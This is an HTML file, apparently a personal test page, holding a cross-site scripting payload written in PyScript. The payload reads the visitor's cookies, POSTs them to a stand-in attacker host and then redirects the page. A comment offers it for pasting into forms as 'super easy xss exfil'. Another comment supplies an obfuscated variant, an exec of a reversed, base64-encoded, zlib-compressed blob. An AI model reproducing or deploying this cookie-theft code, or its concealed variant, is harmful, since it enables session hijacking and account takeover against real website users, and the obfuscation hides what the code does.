<!doctype html>

<html>
<head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width,initial-scale=1" />
      <title>XSS Cookie stealing test</title>
</head>

<body>
<!-- This part can be coppied into a form, super easy xss exfil if you can get it to load, moved this script part to the body for this note -->
<script type="module" src="https://pyscript.net/releases/2024.3.2/core.js"></script>
<section class="pyscript"><br />
<script type="py">
from js import XMLHttpRequest
from io import StringIO
from pyscript import document
all_cookies = document.cookie
def my_open_url(url: str) -> StringIO:
 req = XMLHttpRequest.new()
 req.open("POST", url, False)
 req.setRequestHeader("Origin", "*")
 req.send(all_cookies)
 return StringIO(req.response)

url = "https://badstuff.evil.local"
try:
    my_open_url(url).read()
except:
    pass
document.location.assign(document.location.origin)

</script>
</section>
<!-- end of copy part, an alternative to this would be something like this easy obfuscated version:
<script type="module" src="https://pyscript.net/releases/2024.3.2/core.js"></script><section class="pyscript"><br /><script type="py">_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))</script></section>
-->

<!-- Maybe doing something more useful than xss with python in a webbrowser, which is really just the same javascript nonsense anyway, is a thing too. 
It's hard to not feel like "its just javascript" though when everything you can use within pyodide or wpy is still heavily reliant on js or wasm instructions. -->
    </body>
</html>

